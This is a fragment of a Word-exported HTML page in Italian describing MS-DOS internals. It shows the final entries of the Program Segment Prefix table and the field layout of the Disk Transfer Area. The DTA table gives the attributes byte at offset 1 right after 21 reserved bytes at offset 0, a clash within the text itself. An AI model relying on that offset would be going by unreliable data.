</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>85<span style="mso-spacerun:
yes">       </span>55<span style="mso-spacerun: yes">     </span>7<span
style="mso-spacerun: yes">          </span>Etensione FCB 1<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>14.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">         </span>92<span style="mso-spacerun:
yes">       </span>5C<span style="mso-spacerun: yes">     </span>9<span
style="mso-spacerun: yes">         </span>FCB<span style="mso-spacerun: yes"> 
</span>1<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>15.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>101<span style="mso-spacerun:
yes">      </span>65<span style="mso-spacerun: yes">     </span>7<span
style="mso-spacerun: yes">          </span>Estensione FCB<span
style="mso-spacerun: yes">  </span>2<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>16.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">     </span>108<span style="mso-spacerun: yes">      </span>6C<span
style="mso-spacerun: yes">    </span>20<span style="mso-spacerun: yes">       
</span>FCB 2<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>17.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>128<span style="mso-spacerun:
yes">      </span>80<span style="mso-spacerun: yes">     </span>1<span
style="mso-spacerun: yes">          </span>Lunghezza linea di comando<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>18.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>129<span style="mso-spacerun:
yes">      </span>81<span style="mso-spacerun: yes">    </span>127<span
style="mso-spacerun: yes">       </span>Linea di comando<o:p></o:p></span></p>

<p class=MsoPlainText style='margin-left:36.0pt;text-align:justify;text-indent:
-18.0pt;mso-list:l0 level1 lfo6;tab-stops:list 36.0pt'><![if !supportLists]><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>19.<span style='font:7.0pt "Times New Roman"'>&nbsp;
</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt;
font-family:"Times New Roman";mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>128<span style="mso-spacerun:
yes">      </span>80<span style="mso-spacerun: yes">    </span>128<span
style="mso-spacerun: yes">       </span>DTA<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>3. la DTA<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'>la DTA (Disk Transfer Area) e' cosi' strutturata:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>offset<span
style="mso-spacerun: yes">    </span>bytes<span style="mso-spacerun:
yes">       </span>contenuto<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">  </span>0<span
style="mso-spacerun: yes">          </span>21<span style="mso-spacerun:
yes">          </span>riservato<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes">  </span>1<span
style="mso-spacerun: yes">           </span>1<span style="mso-spacerun:
yes">           </span>attributi del file<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>22<span
style="mso-spacerun: yes">           </span>2<span style="mso-spacerun:
yes">          </span>ora ultima modifica <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>24<span
style="mso-spacerun: yes">           </span>2<span style="mso-spacerun:
yes">          </span>data ultima modifica<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>26<span
style="mso-spacerun: yes">           </span>4<span style="mso-spacerun:
yes">          </span>misura del file in bytes<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";color:#CCFFFF'><span style="mso-spacerun: yes"> </span>30<span
style="mso-spacerun: yes">   </span><span style="mso-spacerun:
yes">       </span>13<span style="mso-spacerun: yes">         </span>nome del
file (ASCIIZ)<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b><span style='mso-fareast-font-family:
"MS Mincho";color:#C7DB65'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

</div>

</body>

</html>
